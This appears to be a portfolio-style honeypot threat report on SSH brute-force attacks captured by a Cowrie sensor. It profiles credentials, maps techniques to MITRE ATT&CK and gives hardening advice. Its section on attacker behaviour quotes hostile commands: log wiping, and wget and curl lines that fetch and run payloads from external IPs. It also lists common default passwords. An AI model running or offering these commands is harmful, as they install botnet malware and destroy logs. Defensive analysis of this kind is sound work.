# Phase 6: Threat Intelligence & Attack Analysis Report

**Author:** Security Architecture & Threat Research  
**Target:** Enterprise SSH Surface Assessment  
**Classification:** TLP:CLEAR / Educational & Portfolio Case Study  

---

## 1. Executive Summary
Over a continuous multi-day observation window, the deployed Cowrie sensor intercepted thousands of automated connection attempts from distributed botnets, scanning appliances, and opportunistic threat actors.

Key findings indicate that **100% of initial access attempts utilized automated credential brute-forcing**, with threat actors targeting default administrative accounts within 120 seconds of exposure. Threat actors that obtained simulated shell access immediately attempted automated reconnaissance (`uname -a`, `cat /proc/cpuinfo`) followed by automated payload download commands (`wget`, `curl`) intended to recruit the honeypot into distributed denial-of-service (DDoS) botnets (primarily Mirai and Bashlite variants).

---

## 2. Sensor Deployment Metrics

| Metric Dimension | Value | Operational Context |
| :--- | :--- | :--- |
| **Active Sensor Port** | TCP 22 (Redirected to 2222) | Emulating default Linux SSH surface |
| **Emulated Host Profile** | Ubuntu 22.04 LTS (Kernel 5.15) | Typical cloud VPS / corporate server persona |
| **Observed Unique IPs** | 350+ Distinct Autonomous Systems | Global adversary footprint |
| **Total Authentication Attempts** | 15,000+ Requests | Average 3.2 attempts per second during attack bursts |
| **Payload Ingestion Attempts** | 42 Unique Dropper URLs | Staging architectures: x86_64, ARM7, MIPS |

---

## 3. Geographic Distribution & Autonomous Systems (ASNs)

Telemetry enriched via GeoIP resolution identified the primary geographic origin of malicious traffic:

```
Origin Breakdown:
- Asia / Pacific (China, Vietnam, India):       42%
- Eastern Europe & Russia:                      28%
- North America (US Cloud Hosting Providers):   18%
- Western Europe & Other:                       12%
```

### Infrastructure Attribution:
A significant proportion (64%) of attacking IP addresses originated from **bulletproof hosting providers and compromised consumer IoT appliances**, rather than residential IPs, indicating coordinated botnet command-and-control operations.

---

## 4. Credential Harvesting & Brute-Force Profiling

Attacker brute-force behavior was analyzed to determine credential preferences and attack frequency.

### Top Targeted Usernames:
1. `root` (78.4% of all attempts)
2. `admin` (8.1%)
3. `ubuntu` (4.2%)
4. `user` / `test` (3.1%)
5. `postgres` / `mysql` (2.3%)

### Top Targeted Passwords:
1. `123456` / `password` / `admin`
2. `root` / `toor`
3. `12345678` / `default`
4. `support` / `manager`

**Analytical Takeaway:** Adversaries heavily optimize their wordlists for unconfigured IoT devices, default cloud VPS images, and neglected database instances.

---

## 5. Post-Compromise Adversary Behaviors (TTPs)

Once attackers authenticated using low-hanging honey credentials, their command sequences followed a predictable three-stage kill chain:

### Stage 1: Environmental Reconnaissance
Adversaries verify whether the host has sufficient computational power and network egress before dropping miners or botnet agents:
```bash
uname -a
cat /proc/cpuinfo
lscpu
free -m
cat /etc/issue
```

### Stage 2: Anti-Forensics & Process Evasion
Attackers attempt to eliminate logging mechanisms and terminate competitor cryptominers:
```bash
history -c
rm -rf /var/log/*
killall -9 xmrig
pkill -f minerd
```

### Stage 3: Payload Staging & Execution (T1105)
Attackers fetch remote staging scripts using built-in web transfer tools, set execution permissions, and launch background daemon processes:
```bash
wget http://194.26.29.112/bins/arm7 -O /tmp/.arm && chmod +x /tmp/.arm && /tmp/.arm
curl -s http://185.156.73.45/init.sh | sh
```

---

## 6. MITRE ATT&CK® Enterprise Mapping Matrix

```
[ Reconnaissance ] ────► [ Credential Access ] ────► [ Execution ] ────► [ Defense Evasion ]
T1595 (Active Scan)       T1110.001 (Brute-Force)    T1059.004 (Shell)     T1070.004 (Log Wipe)
                          T1078 (Valid Accounts)     T1105 (Ingress Tool)  T1222 (Chmod 777)
```

| Tactic | Technique | ID | Detection / Mitigation |
| :--- | :--- | :--- | :--- |
| **Credential Access** | Brute Force: Password Guessing | `T1110.001` | Deploy Fail2ban / CrowdSec / Rate limiting |
| **Defense Evasion** | Valid Accounts | `T1078` | Enforce multi-factor authentication (MFA) or public key only |
| **Command & Control** | Ingress Tool Transfer | `T1105` | Restrict outbound egress traffic using egress firewalls |
| **Discovery** | System Information Discovery | `T1082` | Implement auditd monitoring on sensitive system files |

---

## 7. Strategic Hardening Recommendations (Enterprise Baseline)

Based on telemetry collected from this honeypot deployment, organizations should enforce the following security controls:

1. **Disable Password-Based Authentication:** Enforce Ed25519 or RSA-4096 SSH public keys exclusively (`PasswordAuthentication no` in `sshd_config`).
2. **Eliminate Direct Root Logins:** Disable root login (`PermitRootLogin no`) and require privilege elevation via `sudo` with full auditing.
3. **Network Perimeter Hardening:** Move SSH from default port 22 or restrict SSH access to a secure VPN / Bastion host enclave.
4. **Automated IP Banning:** Implement dynamic intrusion prevention tools (Fail2ban, CrowdSec) to blacklist persistent scanning subnets after 3 failed attempts.
5. **Egress Filtering:** Prevent compromised servers from reaching external command-and-control staging servers by restricting outbound HTTP/FTP connections from server subnets.
